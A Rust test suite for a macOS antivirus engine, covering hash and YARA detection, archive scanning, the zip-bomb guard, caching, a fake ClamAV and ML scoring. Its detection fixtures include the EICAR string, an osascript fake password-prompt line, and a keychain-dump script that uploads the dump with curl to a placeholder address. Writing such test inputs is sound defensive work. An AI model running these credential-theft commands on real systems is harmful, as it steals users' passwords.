//! End-to-end engine tests (run on Linux): fake bundle, hash DB, built-in and bundle rules,
//! containers, zip-bomb guard, cache, ClamAV merge (fake clamscan), ML, performance.

use super::*;
use std::collections::BTreeMap;
use std::io::Write;

pub(crate) const EICAR: &[u8] =
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
const MALWARE_SAMPLE: &[u8] = b"\x7fnot-really-malware: sample listed in the hash DB\n";
const VERSION: &str = "2026.10.25.1";

struct Fixture {
    _dir: tempfile::TempDir,
    paths: Paths,
    data: PathBuf,
}

/// Detection signature data files, shipped by the installer; embedded only in the test binary.
const BUILTIN_YAR: &[u8] = include_bytes!("../../../signatures/builtin.yar");
const MACHO_PATTERNS_JSON: &[u8] = include_bytes!("../../../signatures/macho_patterns.json");
const SCRIPT_PATTERNS_JSON: &[u8] = include_bytes!("../../../signatures/script_patterns.json");

fn fixture() -> Fixture {
    let dir = tempfile::tempdir().unwrap();
    let paths = Paths::with_root(dir.path().join("root"));
    for d in paths.all_dirs() {
        std::fs::create_dir_all(d).unwrap();
    }
    // Install the signature data files the way the pkg would (built-in YARA + ML indicator tables),
    // so the engine detects EICAR and the ML classifiers have their feature columns.
    let sig = paths.signatures_dir();
    std::fs::write(sig.join("builtin.yar"), BUILTIN_YAR).unwrap();
    std::fs::write(sig.join("macho_patterns.json"), MACHO_PATTERNS_JSON).unwrap();
    std::fs::write(sig.join("script_patterns.json"), SCRIPT_PATTERNS_JSON).unwrap();
    let data = dir.path().join("data");
    std::fs::create_dir_all(&data).unwrap();
    Fixture {
        _dir: dir,
        paths,
        data,
    }
}

fn sha(b: &[u8]) -> [u8; 32] {
    Sha256::digest(b).into()
}

fn write_digests(path: &Path, items: &[&[u8]]) {
    let mut d: Vec<[u8; 32]> = items.iter().map(|b| sha(b)).collect();
    // A few unrelated digests so the binary search has something to do.
    for i in 0..50u8 {
        d.push(sha(&[i; 7]));
    }
    d.sort();
    d.dedup();
    std::fs::write(path, d.concat()).unwrap();
}

/// Installs a bundle under `paths.db_versions_dir()/VERSION` and points `db/current` at it.
fn install_bundle(
    paths: &Paths,
    malware: &[&[u8]],
    allow: &[&[u8]],
    extra: impl FnOnce(&Path),
) -> PathBuf {
    let b = paths.db_versions_dir().join(VERSION);
    for sub in ["hashes", "yara", "allow", "clamav"] {
        std::fs::create_dir_all(b.join(sub)).unwrap();
    }
    write_digests(&b.join("hashes/malware.sha256"), malware);
    write_digests(&b.join("hashes/allow.sha256"), allow);
    let mut names: Vec<String> = malware
        .iter()
        .map(|m| format!("{}\tMacOS.Test.Sample", hex::encode(sha(m))))
        .collect();
    names.sort();
    std::fs::write(b.join("hashes/malware_names.tsv"), names.join("\n")).unwrap();
    std::fs::write(
        b.join("yara/test.yar"),
        "rule Test_Marker { meta: family = \"MacOS.Test.Marker\" severity = \"high\" description = \"test rule\" \
         strings: $m = \"PARABELLUM-TEST-MARKER\" condition: $m }",
    )
    .unwrap();
    std::fs::write(
        b.join("yara/broken.yar"),
        "rule Broken { strings: $a = \"x\" condition: $b }",
    )
    .unwrap();
    std::fs::write(
        b.join("allow/team_ids.txt"),
        "# trusted\nABCDE12345\nnot-a-team-id\n",
    )
    .unwrap();
    let manifest = pb_core::db::DbManifest {
        format: pb_core::db::DB_FORMAT,
        version: VERSION.into(),
        built_at: 0,
        min_client_version: "0.1.0".into(),
        sources: vec![],
        files: BTreeMap::new(),
        stats: Default::default(),
    };
    std::fs::write(
        b.join("manifest.json"),
        serde_json::to_vec(&manifest).unwrap(),
    )
    .unwrap();
    extra(&b);
    let current = paths.db_current();
    let _ = std::fs::remove_file(&current);
    std::os::unix::fs::symlink(&b, &current).unwrap();
    b
}

fn opts() -> ScanOptions {
    ScanOptions::default()
}

fn zip_bytes(entries: &[(&str, &[u8], bool)]) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    for (name, data, stored) in entries {
        let o = zip::write::SimpleFileOptions::default().compression_method(if *stored {
            zip::CompressionMethod::Stored
        } else {
            zip::CompressionMethod::Deflated
        });
        w.start_file(*name, o).unwrap();
        w.write_all(data).unwrap();
    }
    w.finish().unwrap().into_inner()
}

fn collect(engine: &Engine, paths: &[PathBuf], o: &ScanOptions) -> (Vec<ScanReport>, ScanTotals) {
    let mut reports = Vec::new();
    let totals = engine.scan_paths(paths, o, &AtomicBool::new(false), &mut |r| {
        reports.push(r.clone())
    });
    (reports, totals)
}

#[test]
fn engine_is_send_sync() {
    fn assert_send_sync<T: Send + Sync>() {}
    assert_send_sync::<Engine>();
}

#[test]
fn loads_without_bundle_and_detects_eicar() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let s = e.stats();
    assert_eq!(s.db_version, None);
    assert_eq!(s.malware_hashes, 0);
    assert_eq!(s.yara_rules, 4);
    assert!(s.warnings.iter().any(|w| w.contains("no threat database")));

    let p = f.data.join("eicar.com");
    std::fs::write(&p, EICAR).unwrap();
    let r = e.scan_file(&p, &opts());
    assert_eq!(r.verdict, Verdict::Malicious, "{r:?}");
    assert_eq!(r.detections[0].name, "EICAR-Test-File");
    assert_eq!(r.sha256.as_deref(), Some(hex::encode(sha(EICAR)).as_str()));
    assert!(!r.cached);
    assert!(r.error.is_none());

    let clean = f.data.join("notes.txt");
    std::fs::write(&clean, b"just some notes").unwrap();
    let r = e.scan_file(&clean, &opts());
    assert_eq!(r.verdict, Verdict::Clean);
    assert!(r.detections.is_empty());
}

#[test]
fn hash_db_allowlists_and_bundle_rules() {
    let f = fixture();
    let allowed_but_eicar: &[u8] =
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\r\n";
    install_bundle(&f.paths, &[MALWARE_SAMPLE], &[allowed_but_eicar], |_| {});
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let s = e.stats();
    assert_eq!(s.db_version.as_deref(), Some(VERSION));
    assert_eq!(s.malware_hashes, 51);
    assert_eq!(s.allow_hashes, 51);
    assert_eq!(
        s.yara_rules, 5,
        "built-in 4 + test.yar (broken.yar skipped)"
    );
    assert!(
        s.warnings.iter().any(|w| w.contains("broken.yar")),
        "{:?}",
        s.warnings
    );
    assert!(e.team_ids.contains("ABCDE12345") && e.team_ids.len() == 1);

    // Hash DB hit.
    let m = f.data.join("sample.bin");
    std::fs::write(&m, MALWARE_SAMPLE).unwrap();
    let r = e.scan_file(&m, &opts());
    assert_eq!(r.verdict, Verdict::Malicious);
    assert_eq!(r.detections[0].engine, DetectionEngine::HashDb);
    assert_eq!(r.detections[0].name, "MacOS.Test.Sample");
    assert!((r.score - 0.99).abs() < 1e-6);

    // Bundle allowlist wins over the built-in EICAR rule.
    let a = f.data.join("allowed.com");
    std::fs::write(&a, allowed_but_eicar).unwrap();
    let r = e.scan_file(&a, &opts());
    assert_eq!(r.verdict, Verdict::Clean, "{r:?}");
    assert!(r.detections.is_empty());

    // Local allowlist wins over the hash DB, and clears the cache.
    assert_eq!(e.scan_file(&m, &opts()).verdict, Verdict::Malicious);
    assert!(e.scan_file(&m, &opts()).cached);
    e.set_local_allowlist(&[
        hex::encode(sha(MALWARE_SAMPLE)).to_uppercase(),
        "garbage".into(),
    ]);
    let r = e.scan_file(&m, &opts());
    assert_eq!(r.verdict, Verdict::Clean);
    assert!(!r.cached);

    // Bundle YARA rule (high severity, unsigned) => malicious.
    let y = f.data.join("marker.txt");
    std::fs::write(&y, b"hello PARABELLUM-TEST-MARKER world").unwrap();
    let r = e.scan_file(&y, &opts());
    assert_eq!(r.verdict, Verdict::Malicious);
    assert_eq!(r.detections[0].name, "MacOS.Test.Marker");
}

#[test]
fn hash_db_file_with_bad_length_degrades() {
    let f = fixture();
    let b = install_bundle(&f.paths, &[MALWARE_SAMPLE], &[], |_| {});
    std::fs::write(b.join("hashes/malware.sha256"), [0u8; 33]).unwrap();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    assert_eq!(e.stats().malware_hashes, 0);
    assert!(e
        .stats()
        .warnings
        .iter()
        .any(|w| w.contains("multiple of 32")));
}

#[test]
fn zip_members_nested_and_rollup() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let inner = zip_bytes(&[("eicar.com", EICAR, true)]);
    let x = f.data.join("x.zip");
    std::fs::write(
        &x,
        zip_bytes(&[
            ("eicar.com", EICAR, false),
            ("readme.txt", b"hello", false),
            ("dir/inner.zip", &inner, true),
        ]),
    )
    .unwrap();

    let (reports, totals) = collect(&e, std::slice::from_ref(&x), &opts());
    let by_path: BTreeMap<&str, &ScanReport> =
        reports.iter().map(|r| (r.path.as_str(), r)).collect();
    let xs = x.to_string_lossy();
    let member = by_path[format!("{xs}!/eicar.com").as_str()];
    assert_eq!(member.verdict, Verdict::Malicious);
    assert_eq!(member.size, EICAR.len() as u64);
    assert_eq!(
        member.sha256.as_deref(),
        Some(hex::encode(sha(EICAR)).as_str())
    );
    assert_eq!(
        by_path[format!("{xs}!/readme.txt").as_str()].verdict,
        Verdict::Clean
    );
    let nested = by_path[format!("{xs}!/dir/inner.zip!/eicar.com").as_str()];
    assert_eq!(nested.verdict, Verdict::Malicious);
    assert_eq!(
        by_path[format!("{xs}!/dir/inner.zip").as_str()].verdict,
        Verdict::Malicious
    );
    let container = by_path[xs.as_ref()];
    assert_eq!(container.verdict, Verdict::Malicious);
    assert_eq!(container.kind, FileKind::Zip);
    assert!(container.detections.iter().any(|d| d
        .details
        .as_deref()
        .is_some_and(|x| x.starts_with("in eicar.com"))));
    // Container is delivered after its members.
    assert_eq!(reports.last().unwrap().path, xs);
    assert_eq!(
        totals.threats, 1,
        "members roll up into the on-disk container"
    );
    assert_eq!(totals.files, 5); // container + 3 members + nested member

    // scan_file: single rolled-up report.
    let r = e.scan_file(&x, &opts());
    assert_eq!(r.verdict, Verdict::Malicious);
    assert_eq!(r.path, xs);

    // Depth limit: with depth 1 the nested zip is not expanded.
    let mut o = opts();
    o.archive_max_depth = 1;
    let (reports, _) = collect(&e, &[x], &o);
    assert!(!reports
        .iter()
        .any(|r| r.path.ends_with("inner.zip!/eicar.com")));
}

#[test]
fn zip_bomb_guard() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let zeros = vec![0u8; 20 * 1024 * 1024];
    let bomb = f.data.join("bomb.zip");
    std::fs::write(&bomb, zip_bytes(&[("zeros.bin", &zeros, false)])).unwrap();
    assert!(std::fs::metadata(&bomb).unwrap().len() < 200_000);
    let r = e.scan_file(&bomb, &opts());
    assert_eq!(r.verdict, Verdict::Clean);
    assert!(
        r.error.as_deref().is_some_and(|x| x.contains("zip bomb")),
        "{r:?}"
    );

    // Entry-count limit, checked from the central directory before parsing it.
    let many: Vec<(String, Vec<u8>)> = (0..50)
        .map(|i| (format!("f{i}.txt"), vec![b'a'; 10]))
        .collect();
    let refs: Vec<(&str, &[u8], bool)> = many
        .iter()
        .map(|(n, d)| (n.as_str(), d.as_slice(), false))
        .collect();
    let z = f.data.join("many.zip");
    std::fs::write(&z, zip_bytes(&refs)).unwrap();
    let mut o = opts();
    o.archive_max_entries = 10;
    let (reports, _) = collect(&e, &[z], &o);
    assert_eq!(reports.len(), 1);
    assert!(
        reports[0]
            .error
            .as_deref()
            .is_some_and(|x| x.contains("declares 50 entries")),
        "{:?}",
        reports[0]
    );
}

#[test]
fn tar_gz_members() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    {
        let mut t = tar::Builder::new(&mut gz);
        let mut h = tar::Header::new_gnu();
        h.set_size(EICAR.len() as u64);
        h.set_mode(0o644);
        h.set_cksum();
        t.append_data(&mut h, "pkg/eicar.com", EICAR).unwrap();
        t.finish().unwrap();
    }
    let p = f.data.join("x.tar.gz");
    std::fs::write(&p, gz.finish().unwrap()).unwrap();
    let (reports, totals) = collect(&e, std::slice::from_ref(&p), &opts());
    let ps = p.to_string_lossy();
    assert!(
        reports
            .iter()
            .any(|r| r.path == format!("{ps}!/pkg/eicar.com") && r.verdict == Verdict::Malicious),
        "{reports:?}"
    );
    assert_eq!(totals.threats, 1);

    // Plain .gz of a single file.
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    gz.write_all(EICAR).unwrap();
    let p = f.data.join("eicar.com.gz");
    std::fs::write(&p, gz.finish().unwrap()).unwrap();
    let (reports, _) = collect(&e, std::slice::from_ref(&p), &opts());
    assert!(reports.iter().any(|r| r.path.ends_with("eicar.com.gz!/eicar.com") && r.verdict == Verdict::Malicious), "{reports:?}");
}

#[test]
fn dmg_and_pkg_are_raw_scanned_off_macos() {
    if cfg!(target_os = "macos") {
        return;
    }
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let mut dmg = vec![0u8; 4096];
    let n = dmg.len();
    dmg[n - 512..n - 508].copy_from_slice(b"koly");
    let p = f.data.join("x.dmg");
    std::fs::write(&p, &dmg).unwrap();
    let r = e.scan_file(&p, &opts());
    assert_eq!(r.kind, FileKind::Dmg);
    assert!(r.error.as_deref().is_some_and(|x| x.contains("macOS-only")));
    let p = f.data.join("x.pkg");
    std::fs::write(&p, b"xar!\x00\x1c\x00\x01").unwrap();
    let r = e.scan_file(&p, &opts());
    assert_eq!(r.kind, FileKind::Pkg);
    let mut o = opts();
    o.expand_pkg = false;
    assert!(e.scan_file(&p, &o).error.is_none());
}

#[test]
fn walk_excludes_cache_risky_types_and_cancel() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let d = f.data.join("tree");
    std::fs::create_dir_all(d.join("sub")).unwrap();
    std::fs::create_dir_all(d.join("skip")).unwrap();
    std::fs::write(d.join("cat.jpg"), [0xff, 0xd8, 0xff, 0xe0, 1, 2, 3]).unwrap();
    std::fs::write(d.join("sub/run.sh"), b"#!/bin/sh\necho hi\n").unwrap();
    std::fs::write(d.join("sub/eicar.com"), EICAR).unwrap();
    std::fs::write(d.join("skip/eicar.com"), EICAR).unwrap();
    std::os::unix::fs::symlink(d.join("sub/eicar.com"), d.join("link.com")).unwrap();

    let mut o = opts();
    o.exclude_prefixes = vec![d.join("skip")];
    let (reports, totals) = collect(&e, std::slice::from_ref(&d), &o);
    assert_eq!(totals.files, 3, "{reports:?}"); // cat.jpg, run.sh, sub/eicar.com (symlink and excluded dir skipped)
    assert_eq!(totals.threats, 1);
    assert!(!totals.cancelled);

    // Second pass comes from the cache.
    let (reports, _) = collect(&e, std::slice::from_ref(&d), &o);
    assert!(reports.iter().all(|r| r.cached), "{reports:?}");
    // Modified file is rescanned.
    std::fs::write(d.join("sub/run.sh"), b"#!/bin/sh\necho changed\n").unwrap();
    let (reports, _) = collect(&e, std::slice::from_ref(&d), &o);
    assert!(reports
        .iter()
        .any(|r| r.path.ends_with("run.sh") && !r.cached));

    // Only risky types: the JPEG is neither hashed nor counted.
    o.only_risky_types = true;
    let (reports, totals) = collect(&e, std::slice::from_ref(&d), &o);
    assert_eq!(totals.files, 2, "{reports:?}");
    assert!(!reports.iter().any(|r| r.path.ends_with("cat.jpg")));

    // Non-recursive.
    o.only_risky_types = false;
    o.recursive = false;
    let (_, totals) = collect(&e, std::slice::from_ref(&d), &o);
    assert_eq!(totals.files, 1);

    // Full scans: only directories on the allowed file systems are entered (roots are not checked).
    o.recursive = true;
    let dev = std::fs::metadata(&d).unwrap().dev();
    o.allowed_devices = vec![dev];
    let (_, totals) = collect(&e, std::slice::from_ref(&d), &o);
    assert_eq!(totals.files, 3);
    o.allowed_devices = vec![dev.wrapping_add(1)];
    let (_, totals) = collect(&e, std::slice::from_ref(&d), &o);
    assert_eq!(
        totals.files, 1,
        "sub/ is on another file system: only the root's own files"
    );
    o.allowed_devices.clear();
    // No cloud-only file here: nothing skipped.
    o.skip_dataless = true;
    let (_, totals) = collect(&e, std::slice::from_ref(&d), &o);
    assert_eq!(totals.files, 3);
    assert!(!is_dataless(&std::fs::metadata(d.join("cat.jpg")).unwrap()));

    // Directory summary through scan_file.
    let mut o2 = opts();
    o2.exclude_prefixes = vec![d.join("skip")];
    let r = e.scan_file(&d, &o2);
    assert_eq!(r.verdict, Verdict::Malicious);
    assert!(
        r.detections[0]
            .details
            .as_deref()
            .unwrap()
            .starts_with("in sub/eicar.com"),
        "{r:?}"
    );

    // Cancelled before start.
    let cancel = AtomicBool::new(true);
    let mut n = 0;
    let t = e.scan_paths(std::slice::from_ref(&d), &opts(), &cancel, &mut |_| n += 1);
    assert!(t.cancelled);
    assert_eq!(n, 0);

    // The Parabellum root itself is never scanned.
    std::fs::write(f.paths.cache_dir().join("eicar.com"), EICAR).unwrap();
    let (_, totals) = collect(&e, std::slice::from_ref(&f.paths.root), &opts());
    assert_eq!(totals.files, 0);

    // Missing path => error report.
    let (reports, totals) = collect(&e, &[f.data.join("missing")], &opts());
    assert_eq!(totals.errors, 1);
    assert!(reports[0].error.is_some());
}

#[test]
fn big_files_are_hashed_and_their_head_still_scanned() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let p = f.data.join("big.bin");
    // A stealer-style script padded past max_file_size (EICAR itself only matches under 256 bytes).
    let mut content = b"osascript -e 'display dialog \"Enter password\" default answer \"\" with hidden answer' ; dscl /Local/Default -authonly\n".to_vec();
    content.resize(3 * 1024 * 1024, b' ');
    std::fs::write(&p, &content).unwrap();
    let mut o = opts();
    o.max_file_size = 1024 * 1024;
    let r = e.scan_file(&p, &o);
    // Padding past max_file_size no longer hides the payload from the rules.
    assert_ne!(r.verdict, Verdict::Clean);
    assert_eq!(
        r.sha256.as_deref(),
        Some(hex::encode(sha(&content)).as_str())
    );
    assert!(r
        .error
        .as_deref()
        .is_some_and(|x| x.contains("hash check + YARA")));
    assert_eq!(sha256_file(&p).unwrap(), hex::encode(sha(&content)));
}

#[test]
fn clamav_results_are_merged_before_delivery() {
    let f = fixture();
    let mut e = Engine::load(&f.paths, &Config::default()).unwrap();
    let bin = f.data.join("fake-clamscan");
    std::fs::write(
        &bin,
        "#!/bin/sh\nif [ \"$1\" = \"--version\" ]; then echo 'ClamAV 1.4.1/1/test'; exit 0; fi\n\
         seen=0\nfor a in \"$@\"; do if [ $seen = 1 ]; then case \"$a\" in *clam-bad*) echo \"$a: Osx.Trojan.Test-1 FOUND\";; *pua*) echo \"$a: PUA.Osx.Adware.Test FOUND\";; esac; fi; [ \"$a\" = \"--\" ] && seen=1; done\nexit 1\n",
    )
    .unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();
    e.clamav = clamav::ClamAv::locate_in(std::iter::once(bin), &f.paths.clamav_db_dir(), None);
    assert!(e.stats().clamav_available);
    let d = f.data.join("c");
    std::fs::create_dir_all(&d).unwrap();
    for i in 0..300 {
        std::fs::write(d.join(format!("ok-{i}.txt")), format!("file {i}")).unwrap();
    }
    std::fs::write(d.join("clam-bad.bin"), b"payload").unwrap();
    std::fs::write(d.join("pua.bin"), b"adware").unwrap();
    std::fs::write(
        d.join("z.zip"),
        zip_bytes(&[("clam-bad-member.txt", b"x", false)]),
    )
    .unwrap();
    let mut o = opts();
    o.use_clamav = true;
    let (reports, totals) = collect(&e, std::slice::from_ref(&d), &o);
    assert_eq!(totals.files, 304);
    let bad = reports
        .iter()
        .find(|r| r.path.ends_with("clam-bad.bin"))
        .unwrap();
    assert_eq!(bad.verdict, Verdict::Malicious);
    assert_eq!(bad.detections[0].engine, DetectionEngine::ClamAv);
    assert_eq!(bad.detections[0].name, "Osx.Trojan.Test-1");
    let pua = reports
        .iter()
        .find(|r| r.path.ends_with("pua.bin"))
        .unwrap();
    assert_eq!(pua.verdict, Verdict::Suspicious);
    // Members are never passed to clamscan (it scans the container itself).
    let member = reports
        .iter()
        .find(|r| r.path.ends_with("z.zip!/clam-bad-member.txt"))
        .unwrap();
    assert_eq!(member.verdict, Verdict::Clean);
    assert_eq!(totals.threats, 2);
    // Single file API.
    assert_eq!(
        e.scan_file(&d.join("clam-bad.bin"), &o).verdict,
        Verdict::Malicious
    );
    assert_eq!(
        e.scan_file(&d.join("clam-bad.bin"), &opts()).verdict,
        Verdict::Clean
    );
}

#[test]
fn ml_flags_suspicious_only() {
    let f = fixture();
    install_bundle(&f.paths, &[], &[], |b| {
        std::fs::create_dir_all(b.join("ml")).unwrap();
        std::fs::write(
            b.join(pb_ml::MODEL_FILE),
            pb_ml::test_model_json("str_osascript", 0.5, -3.0, 3.0),
        )
        .unwrap();
        std::fs::write(
            b.join(pb_ml::MODEL_META_FILE),
            format!(
                r#"{{"features_version":{},"threshold":0.9,"version":"ml-test-1"}}"#,
                pb_ml::FEATURES_VERSION
            ),
        )
        .unwrap();
    });
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    assert_eq!(e.stats().ml_model_version.as_deref(), Some("ml-test-1"));
    let bad = pb_ml::testutil::MachOBuilder::new_arm64_execute()
        .cstrings(&["osascript -e 'do shell script'"])
        .build();
    let good = pb_ml::testutil::MachOBuilder::new_arm64_execute()
        .cstrings(&["hello"])
        .build();
    std::fs::write(f.data.join("bad"), &bad).unwrap();
    std::fs::write(f.data.join("good"), &good).unwrap();
    let r = e.scan_file(&f.data.join("bad"), &opts());
    assert_eq!(r.kind, FileKind::MachO);
    assert_eq!(r.verdict, Verdict::Suspicious, "{r:?}");
    assert_eq!(r.detections[0].engine, DetectionEngine::Ml);
    assert!(r.score > 0.9);
    assert_eq!(
        e.scan_file(&f.data.join("good"), &opts()).verdict,
        Verdict::Clean
    );
    let mut o = opts();
    o.use_ml = false;
    assert_eq!(e.scan_file(&f.data.join("bad"), &o).verdict, Verdict::Clean);
}

#[test]
fn ml_script_model_flags_scripts_suspicious_only() {
    let f = fixture();
    // Without any model in the bundle: nothing ML-related happens, models are listed as absent.
    install_bundle(&f.paths, &[], &[], |_| {});
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let infos = e.stats().models;
    assert_eq!(
        infos.iter().map(|m| m.name.as_str()).collect::<Vec<_>>(),
        ["macho", "script"]
    );
    assert!(infos.iter().all(|m| !m.loaded && m.error.is_none()));
    // TEST STRING (benign but suspicious-looking): keychain dump shape, reserved address.
    let bad = b"#!/bin/sh\n# TEST FIXTURE\nsecurity find-generic-password -ga test > /tmp/.t\ncurl -F f=@/tmp/.t http://192.0.2.1/u\n";
    std::fs::write(f.data.join("bad.sh"), bad).unwrap();
    std::fs::write(f.data.join("good.sh"), b"#!/bin/sh\necho hello\n").unwrap();
    assert_eq!(
        e.scan_file(&f.data.join("bad.sh"), &opts()).verdict,
        Verdict::Clean
    );

    let f = fixture();
    install_bundle(&f.paths, &[], &[], |b| {
        std::fs::create_dir_all(b.join("ml")).unwrap();
        std::fs::write(
            b.join(pb_ml::SCRIPT_MODEL_FILE),
            pb_ml::test_model_json_for(
                pb_ml::script_feature_names(),
                "ind_keychain",
                0.5,
                -3.0,
                3.0,
            ),
        )
        .unwrap();
        std::fs::write(
            b.join(pb_ml::SCRIPT_MODEL_META_FILE),
            format!(
                r#"{{"features_version":{},"threshold":0.9,"version":"script-test-1","metrics":{{"pr_auc":0.93,"roc_auc":0.99,"trained_at":1792929600}},"calibration":{{"method":"platt","a":1.0,"b":-1.0}}}}"#,
                pb_ml::SCRIPT_FEATURES_VERSION
            ),
        )
        .unwrap();
        // A Mach-O model trained on another feature layout: reported, not loaded, not fatal.
        std::fs::write(
            b.join(pb_ml::MODEL_FILE),
            pb_ml::test_model_json("str_osascript", 0.5, -3.0, 3.0),
        )
        .unwrap();
        std::fs::write(
            b.join(pb_ml::MODEL_META_FILE),
            r#"{"features_version":1,"threshold":0.9,"version":"old"}"#,
        )
        .unwrap();
    });
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let stats = e.stats();
    assert_eq!(stats.ml_model_version, None);
    let macho = &stats.models[0];
    assert!(!macho.loaded && macho.error.as_deref().unwrap().contains("incompatible"));
    let script = &stats.models[1];
    assert!(script.loaded, "{script:?}");
    assert_eq!(script.version.as_deref(), Some("script-test-1"));
    assert_eq!(script.calibration.as_deref(), Some("platt"));
    assert_eq!(script.trained_at, Some(1_792_929_600));
    assert_eq!(script.metrics.pr_auc, Some(0.93));
    assert_eq!(script.trees, Some(1));
    assert!((script.threshold.unwrap() - 0.9).abs() < 1e-6);

    std::fs::write(f.data.join("bad.sh"), bad).unwrap();
    std::fs::write(f.data.join("good.sh"), b"#!/bin/sh\necho hello\n").unwrap();
    let r = e.scan_file(&f.data.join("bad.sh"), &opts());
    assert_eq!(r.kind, FileKind::Script);
    assert_eq!(r.verdict, Verdict::Suspicious, "{r:?}");
    let d = r
        .detections
        .iter()
        .find(|d| d.engine == DetectionEngine::Ml)
        .unwrap();
    assert_eq!(d.name, "ML.Script.Suspicious");
    // Calibrated confidence: sigmoid(1 * 3 - 1).
    assert!((f64::from(d.confidence) - 1.0 / (1.0 + (-2.0f64).exp())).abs() < 1e-5);
    assert!(!crate::scoring::is_signature_grade(d, false));
    assert_eq!(
        e.scan_file(&f.data.join("good.sh"), &opts()).verdict,
        Verdict::Clean
    );
    let mut o = opts();
    o.use_ml = false;
    assert_eq!(
        e.scan_file(&f.data.join("bad.sh"), &o).verdict,
        Verdict::Clean
    );
    // Scripts inside a zip are scored too (member verdict rolls up to the container).
    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    zip.start_file(
        "payload/install.sh",
        zip::write::SimpleFileOptions::default(),
    )
    .unwrap();
    std::io::Write::write_all(&mut zip, bad).unwrap();
    let zbytes = zip.finish().unwrap().into_inner();
    std::fs::write(f.data.join("bundle.zip"), zbytes).unwrap();
    assert_eq!(
        e.scan_file(&f.data.join("bundle.zip"), &opts()).verdict,
        Verdict::Suspicious
    );
}

#[test]
fn realtime_latency_10mb() {
    let f = fixture();
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    let mut state = 0x9e37_79b9_7f4a_7c15u64;
    let content: Vec<u8> = (0..10 * 1024 * 1024)
        .map(|_| {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            (state >> 24) as u8
        })
        .collect();
    let p = f.data.join("random.bin");
    std::fs::write(&p, &content).unwrap();
    let o = ScanOptions {
        use_clamav: false,
        ..opts()
    };
    let _ = e.scan_file(
        &f.data.join("random.bin"),
        &ScanOptions {
            max_file_size: 1,
            ..o.clone()
        },
    ); // warm-up
    let t = Instant::now();
    let r = e.scan_file(&p, &o);
    let ms = t.elapsed().as_millis();
    println!(
        "scan of a 10 MB random file: {ms} ms (engine-reported {} ms, debug build: {})",
        r.duration_ms,
        cfg!(debug_assertions)
    );
    assert_eq!(r.verdict, Verdict::Clean);
    assert!(!r.cached);
    if cfg!(debug_assertions) {
        assert!(ms < 10_000);
    } else {
        assert!(ms < 200, "{ms} ms");
    }
}

#[test]
fn pattern_rules_skip_inert_text_but_not_scripts() {
    let f = fixture();
    install_bundle(&f.paths, &[], &[], |_| {});
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    // A rule source / test file *describing* a phishing dialog is not one.
    let text =
        b"display dialog \"x\" with hidden answer\ndo shell script \"dscl . -authonly u p\"\n";
    for name in ["rule.yar", "tests.rs", "patterns.json"] {
        std::fs::write(f.data.join(name), text).unwrap();
        let r = e.scan_file(&f.data.join(name), &opts());
        assert_eq!(r.verdict, Verdict::Clean, "{name}: {r:?}");
    }
    // Same bytes as something macOS runs: still detected.
    for name in ["x.applescript", "notes.txt"] {
        std::fs::write(f.data.join(name), text).unwrap();
        let r = e.scan_file(&f.data.join(name), &opts());
        assert!(
            r.detections
                .iter()
                .any(|d| d.name == "Heuristic.MacOS.PasswordPhishingDialog"),
            "{name}: {r:?}"
        );
    }
    let mut shebang = b"#!/usr/bin/osascript\n".to_vec();
    shebang.extend_from_slice(text);
    std::fs::write(f.data.join("disguised.json"), &shebang).unwrap();
    let r = e.scan_file(&f.data.join("disguised.json"), &opts());
    assert_eq!(r.kind, FileKind::Script);
    assert!(!r.detections.is_empty(), "{r:?}");
    // Handed to an interpreter: full scan, and the at-rest cache entry is not reused.
    let mut o = opts();
    o.scan_inert_text = true;
    let r = e.scan_file(&f.data.join("rule.yar"), &o);
    assert!(!r.detections.is_empty(), "{r:?}");
    // Hash DB still applies to inert text.
    let f2 = fixture();
    install_bundle(&f2.paths, &[text], &[], |_| {});
    let e2 = Engine::load(&f2.paths, &Config::default()).unwrap();
    std::fs::write(f2.data.join("known.json"), text).unwrap();
    assert_eq!(
        e2.scan_file(&f2.data.join("known.json"), &opts()).verdict,
        Verdict::Malicious
    );
}

/// The repository must not trip its own rules (built-in + `rules/`): a hit here is a false positive the user
/// would get on their own checkout. Build outputs and VCS data are skipped (`target/` holds test binaries
/// that embed the rules on purpose).
#[test]
fn repository_is_clean_under_its_own_rules() {
    const SKIP_DIRS: &[&str] = &[
        "target",
        ".git",
        ".build",
        "dist",
        ".dev-root",
        "node_modules",
        "DerivedData",
        "__pycache__",
        ".venv",
        ".pytest_cache",
        ".ruff_cache",
    ];
    let repo = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
    let f = fixture();
    install_bundle(&f.paths, &[], &[], |b| {
        let yara = b.join("yara");
        std::fs::remove_file(yara.join("test.yar")).unwrap();
        std::fs::remove_file(yara.join("broken.yar")).unwrap();
        for e in std::fs::read_dir(repo.join("rules")).unwrap() {
            let p = e.unwrap().path();
            std::fs::copy(&p, yara.join(p.file_name().unwrap())).unwrap();
        }
    });
    let e = Engine::load(&f.paths, &Config::default()).unwrap();
    assert!(e.stats().yara_rules > 10, "repository rules loaded");

